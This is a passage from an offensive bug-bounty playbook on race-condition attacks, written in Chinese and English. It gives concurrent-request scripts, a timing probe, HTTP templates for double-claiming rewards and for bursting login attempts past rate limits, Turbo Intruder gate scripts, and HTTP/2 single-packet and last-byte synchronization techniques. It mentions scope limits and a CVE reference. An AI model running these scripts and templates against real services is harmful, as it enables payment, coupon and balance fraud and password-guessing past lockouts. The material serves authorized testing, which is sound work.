---
name: playbook-src-race-condition-test-part2
description: "结构：上半原有是主线（支付/券/库存）；下半补充加深（HTTP/2 单包、Turbo Intruder）。支付/券竞态先看原有，单包手法再开补充。（第 2/4 部分）"
tags: [playbook, src-hunting, race, condition, test]
intent: offensive
---
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, headers=headers) for _ in range(20)]
        results = await asyncio.gather(*tasks)
        
        for r in results:
            print(await r.json())
```

---

## 六、高级技巧

### 6.1 延迟释放（Delay Release）

```python
# 在检查和执行之间插入延迟，增加竞态窗口

# 服务端伪代码:
# balance = get_balance(user_id)
# if balance >= amount:
#     time.sleep(0.1)  # 人为延迟
#     deduct_balance(user_id, amount)

# 攻击: 在这0.1秒内发送多个请求
```

### 6.2 连接复用

```python
# 复用 TCP 连接，减少握手时间，提高并发度

import requests
from requests.adapters import HTTPAdapter

session = requests.Session()
adapter = HTTPAdapter(pool_connections=1, pool_maxsize=1)
session.mount('https://', adapter)

# 所有请求使用同一连接
for _ in range(50):
    session.post(url, headers=headers, json=data)
```

### 6.3 时间窗口探测

```python
# 先探测操作耗时，找到最佳攻击窗口

import time

def measure_timing():
    times = []
    for _ in range(10):
        start = time.time()
        requests.post(url, headers=headers, json=data)
        elapsed = time.time() - start
        times.append(elapsed)
    
    avg_time = sum(times) / len(times)
    print(f"平均响应时间: {avg_time:.3f}s")
    
    # 如果响应时间 > 100ms，竞态窗口较大
    return avg_time

# 根据响应时间调整并发数
avg_time = measure_timing()
if avg_time > 0.1:
    concurrent_count = 100  # 窗口大，增加并发
else:
    concurrent_count = 20   # 窗口小，减少并发
```

---

## 七、防护检测

```python
# 检测是否有竞态保护

# 1. 数据库锁（悲观锁）
# 特征: 并发请求时，后续请求等待前一个完成
# 检测: 观察响应时间是否呈阶梯状增长

# 2. 乐观锁（版本号）
# 特征: 并发请求时，只有一个成功，其他返回"版本冲突"
# 检测: 观察失败响应的错误信息

# 3. 分布式锁（Redis）
# 特征: 类似数据库锁
# 检测: 响应时间分析

# 4. 幂等性设计
# 特征: 重复请求返回相同结果，不产生副作用
# 检测: 多次发送相同请求，观察结果是否一致
```

---

## 九、注意事项

1. **测试范围**: 只在自己的测试账号上测试，不要影响其他用户
2. **测试强度**: 并发数不要过大（建议 ≤ 50），避免 DoS
3. **数据恢复**: 测试后检查账户状态，如有异常及时报告
4. **PoC 证据**: 保存测试前后的余额/积分截图，以及所有请求响应

---

## 二、补充：race-condition

### race-condition

### Race Conditions — Testing & Exploitation Playbook


## 0. QUICK START — What to Test First

Target endpoints where **check** and **update** are unlikely to be a single atomic database operation:

| Priority | Operation class | Example paths / parameters |
|----------|------------------|----------------------------|
| 1 | One-time redeem / coupon / bonus | `redeem`, `apply_coupon`, `claim_reward`, `voucher` |
| 2 | Balance / quota / stock deduction | `transfer`, `purchase`, `reserve`, `inventory` |
| 3 | Invite / referral / signup bonus | `invite_accept`, `referral_claim` |
| 4 | Password / email / MFA verification | `verify_token`, `confirm_email`, `reset_password` |
| 5 | Idempotent-looking APIs without strong keys | `POST` that should succeed only once per user |

**First moves (conceptual)**:

1. Capture the **state-changing** request in a proxy.
2. Send **20–100** copies **as simultaneously as your tooling allows**.
3. Classify outcome: **0/1 expected successes** vs **N successes** or **inconsistent final state**.

---

## 1. CORE CONCEPT

### 1.1 TOCTOU (Time-of-check to time-of-use)

```
Thread A                    Thread B
   |                            |
   +-- CHECK (resource OK)      |
   |                            +-- CHECK (resource OK)  ← both see "OK"
   +-- USE / UPDATE             |
   |                            +-- USE / UPDATE           ← duplicate effect
```

**TOCTOU** means the **decision** (check) and the **mutation** (use) are not one indivisible step.

### 1.2 Non-atomic read-then-write

Typical vulnerable pseudo-flow:

```text
balance = SELECT balance FROM accounts WHERE id = ?
if balance >= amount:
    UPDATE accounts SET balance = balance - ? WHERE id = ?
```

Two concurrent requests can both pass the `if` before either `UPDATE` commits.

### 1.3 Database-level vs application-level locking gaps

| Layer | What goes wrong |
|-------|------------------|
| **Application** | In-memory flag, cache, or session says "not used yet" while DB already updated — or the reverse. |
| **ORM / service** | Two instances, no distributed lock; each thinks it owns the decision. |
| **DB** | Missing `SELECT … FOR UPDATE`, wrong isolation level, or logic split across multiple statements without transaction. |
| **API gateway** | Per-IP rate limit is **check-then-increment** — parallel burst passes duplicate checks. |

**Hint**: `UNIQUE` constraints and **idempotency keys** often eliminate entire bug classes — test whether the app **enforces** them on the hot path.

---

## 2. ATTACK PATTERNS

### 2.1 Limit-overrun (double redeem / double claim)

Send the **same** authenticated request many times in parallel:

```http
POST /api/v1/rewards/claim HTTP/1.1
Host: target.example
Authorization: Bearer <token>
Content-Type: application/json

{"reward_id":"welcome_bonus"}
```

**Success signal**: HTTP `200`/`201` more than once, duplicate ledger entries, or balance higher than policy allows.

### 2.2 Rate-limit bypass via simultaneity

If limits are implemented as **counters checked per request** without atomic increment:

```http
POST /api/v1/login HTTP/1.1
Host: target.example
Content-Type: application/json

{"email":"victim@example.com","password":"wrong"}
```

Fire **N** parallel attempts in one wave; compare with **N** sequential attempts.

**Success signal**: more failures accepted than documented cap, or lockout never triggers when burst completes inside one window.

### 2.3 Multi-step exploitation (beat the pipeline)

Workflow: `create → pay → confirm`. If **confirm** does not cryptographically bind to **pay** completion:

1. Start two parallel pipelines from the same session/item.
2. Complete **confirm** on channel B while **pay** on channel A is still in-flight or abandoned.

**Success signal**: item marked paid/shipped without matching payment, or state skips backward.

---

## 3. HTTP/1.1 LAST-BYTE SYNCHRONIZATION

**Idea**: Hold all requests **blocked** until every socket has sent the full request **except the last byte** of the body; then release the final byte together so the server receives them in a tight cluster.

```text
Client 1: [headers + body - 1 byte] ----hold----+
Client 2: [headers + body - 1 byte] ----hold----+--> flush last byte together
Client N: [headers + body - 1 byte] ----hold----+
```

**Why**: Reduces **network jitter** between copies compared to naive sequential paste in Repeater.

**Tooling**: Custom scripts, some Burp extensions, or **Turbo Intruder** `gate` pattern (see §5) as the practical stand-in for synchronized release.

---

## 4. HTTP/2 SINGLE-PACKET ATTACK

**Idea**: Multiplex several complete HTTP/2 streams and **coalesce** their frames so the first bytes of all requests exit the NIC in **one** TCP segment (or minimally separated). Receiver-side scheduling then processes them with **sub-millisecond** spacing.

**Burp Repeater (modern workflows)**:

1. Open multiple tabs or select multiple requests.
2. Use **Send group (parallel)** / **single-packet attack** where available.
3. Prefer HTTP/2 to the target if supported.

```text
  [ Req A stream ]
  [ Req B stream ]  --HTTP/2-->  one burst -->  app worker pool
  [ Req C stream ]
```

**Why it often beats HTTP/1.1 last-byte tricks**: tighter alignment on the wire; less dependence on per-connection serialization.

---

## 5. TURBO INTRUDER TEMPLATES

Repository: [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) (Burp Suite extension).

### 5.1 Template 1 — Same endpoint, gate release

**Settings**: `concurrentConnections=30`, `requestsPerConnection=30`, use a **gate** so all threads fire together.

**Core pattern** (repeat N times, then release):

```python
for _ in range(N):
    engine.queue(request, gate='race1')
engine.openGate('race1')
```

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**Header requirement** (unique per queued copy for log correlation; Turbo Intruder payload placeholder):

```http
x-request: %s
```

Turbo Intruder replaces `%s` per request when paired with a wordlist (or other payload source) — keep this header on the **base request** in Repeater before sending to Turbo Intruder. Case-insensitive for HTTP; use a consistent name for log grep.

### 5.2 Template 2 — Multi-endpoint, same gate

**Pattern**: One **POST** to **target-1** (state change) plus **many GETs** to **target-2** (read side) released together to widen the TOCTOU window observation.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    engine.queue(post_to_target1, gate='race1')
    for _ in range(30):
        engine.queue(get_target2, gate='race1')

    engine.openGate('race1')
```

Adjust hosts/paths by duplicating `RequestEngine` instances if endpoints differ (Turbo Intruder supports multiple engines — consult upstream docs for your Burp version).

---

## 6. CVE REFERENCE — CVE-2022-4037

**CVE-2022-4037** (GitLab CE/EE): race condition leading to **verified email address forgery** and risk when the product acts as an **OAuth identity provider** — third-party account linkage/impact scenarios. **CWE-362**. Demonstrated in public research with **HTTP/2 single-packet** style timing to win narrow windows.

**Takeaway for testers**: email verification, OAuth linking, and "confirm ownership" flows are high-value race targets — not only coupons and balances.

**References (official / neutral)**:

- [NVD — CVE-2022-4037](https://nvd.nist.gov/vuln/detail/CVE-2022-4037)
- GitLab security advisories and vendor CVE JSON for affected version ranges

---

> （续前：playbook-src-race-condition-test 第 2/4 部分）
